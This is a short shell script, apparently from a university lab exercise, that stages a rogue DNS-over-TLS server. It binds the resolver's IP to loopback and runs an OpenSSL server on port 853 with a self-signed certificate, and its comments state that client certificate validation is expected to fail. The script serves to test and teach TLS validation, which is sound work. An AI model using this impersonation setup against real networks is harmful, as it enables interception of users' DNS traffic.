#!/bin/sh
# Attack (ii): Rogue TLS Server Impersonation
# The attacker impersonates the resolver by:
# 1. Assigning 172.16.2.10/32 to its loopback interface.
# 2. Edge-router routing 172.16.2.10/32 to the attacker (172.16.1.100).
# 3. Running an OpenSSL TLS server on port 853 with the untrusted rogue.crt.
#
# Client connects, completes the TCP handshake, but TLS certificate validation
# fails because rogue.crt is self-signed / not signed by CS6008 Root CA.

set -eu

ROGUE_KEY=/lab/pki/rogue.key
ROGUE_CERT=/lab/pki/rogue.crt
PORT=853

echo "=== Attack (ii): Rogue TLS server on port $PORT ==="
echo "[*] Adding resolver IP alias to lo..."
ip addr add 172.16.2.10/32 dev lo 2>/dev/null || true

echo "[*] Stopping any existing rogue server..."
pkill -f 'openssl s_server' 2>/dev/null || true

echo "[*] Starting rogue TLS server on port $PORT..."
nohup openssl s_server \
    -key  "$ROGUE_KEY" \
    -cert "$ROGUE_CERT" \
    -port "$PORT" \
    -quiet > /tmp/rogue_server.log 2>&1 &

sleep 1
echo "[+] Rogue TLS server listening on port $PORT with rogue.crt."
